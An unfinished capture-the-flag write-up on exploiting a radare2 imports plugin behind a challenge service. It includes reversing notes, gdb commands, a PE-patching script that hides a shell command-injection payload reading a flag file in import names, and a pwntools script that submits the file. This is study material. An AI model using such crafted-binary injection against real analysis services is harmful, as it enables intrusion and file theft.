NOTE: This writeup is still WIP. Here are some notes I took while solving the challenge, as well as any solve script(s)

* Reversed `libcoreimp.so`
* Possible attack vectors
	* overwrite command buffer using array OOB write or smth
	* perhaps the `iij` command has some side effects that let us leak the flag? (unlikely)
* BFS
	* read r2 source code to find if theres a way to hijack the `iij` implementation
	* search up windows PE specification & stuff, see if theres anything interesting for external loading
	* nothing
* What the program does
	* Accept a PE file
	* use r2 to extract library dependencies as JSON
	* builds a string of all dependencies in the format `<libraryA>.<functionA>,<libraryB>.<functionB>,...`
	* returns the MD5 hash of the above string
* Ok actually there is pwn vuln(s)
	* `strpbrk(".", ".dll")` returns the string `"."` for some reason. Then integer underflow.
* Research on PIE file format, how to control libname, name and stuff
	* https://maskray.me/blog/2023-12-03-linker-notes-on-pe-coff
	* https://opensecuritytraining.info/LifeOfBinaries.html
	* https://www.youtube.com/watch?v=rbN53Xh21_g&list=PLUFkSN0XLZ-n_Na6jwqopTt1Ki57vMIc3&index=12 (didnt watch)
* Seems like too much trouble
* In the end I decided to just edit the strings in an existing executable file, just replace the extra with null bytes to make it shorter.
* compile empty c program with mingw64 to produce initial pe file. I'll use a python script to patch this file with the desired strings. (see below for final script)
* gdb debugging
	* `gdb --args r2 -q -c imp -e bin.relocs.apply=true a.exe`
	* `catch load libcoreimp.so`
	* `r`
	* `b *r_cmd_imp_client+539`
	* b *r_cmd_imp_client+381 # after json load
* after debugging realised the `==` check is failing (after strpbrk), need to add `a` to front of string, so the module name is:
	* `a.`
* TODO: elaborate on exploiting the vuln

The following is my final patch script:

```python:patch.py
with open('a.exe', 'rb') as f:
    data = f.read()


def replace_single(bin, from_, to):
    occurrences = bin.count(from_)
    # assert occurrences == 1, f'Ambiguous replace: {from_}. Found {occurrences}'
    assert len(from_) == len(
        to), 'Can only replace with string of the same length'
    return bin.replace(from_, to, 1)


i = 0x3894
size = len('KERNEL32.dll')
data = data[:i] + \
    b'a.\x00\x00' + b'\x00'*8 + data[i+size:]

data = replace_single(data, b'msvcrt.dll', b'a.\x00crt.dll')

data = replace_single(data, b'__initenv',
                      b'__init\x00\x00\x00')  # -9
data = replace_single(data, b'__iob_func',
                      b'A"' + b'\x00' * 8)

# payload = b''.join((
#     # move offset back. Now offset is 1 byte after the hash.
#     b'$',
#     # overwrite the command. leave space for the hash
#     b'`cat ../flag.txt`>out',
#     # null byte
#     b'\x00'
# ))

# j = 0x3682

# data = data[:j] + payload + data[j+len(payload):]

data = replace_single(data, b'__set_app_type', b'__s\x00t_app_type')

i = data.find(b'__setusermatherr')
print(hex(i))
payload = b'$(cat /app/flag.txt)>out#AAAAAAA\x00'
data = data[:i] + payload + data[i+len(payload):]

# data = replace_single(data, b'_amsg_exit', b' > out#\x00\x00\x00')

to_remove = [
    # b'__C_specific_handler',
    # b'__getmainargs',
    # b'__initenv',
    # b'__iob_func',
    # b'__set_app_type',
    # b'__setusermatherr',
    # b'_amsg_exit',
    b'_cexit',
    b'_commode',
    b'_fmode',
    b'_initterm',
    b'_onexit',
    b'abort',
    b'calloc',
    b'exit',
    b'fprintf',
    b'free',
    b'fwrite',
    b'malloc',
    b'memcpy',
    b'signal',
    b'strlen',
    b'strncmp',
    b'vfprintf',
]
for str in to_remove:
    data = replace_single(data, str, b'\x00' + str[1:])

with open('a1.exe', 'wb') as f:
    f.write(data)
```

Exploit script:

```python:s.py
from pwn import *
import base64

with open('a1.exe', 'rb') as f:
    data = f.read()
    payload = base64.b64encode(data)

t = remote('chals.tisc24.ctf.sg', 53719)
t.sendlineafter(b'Input PE file (base64 encoded): ', payload)
t.interactive()
```
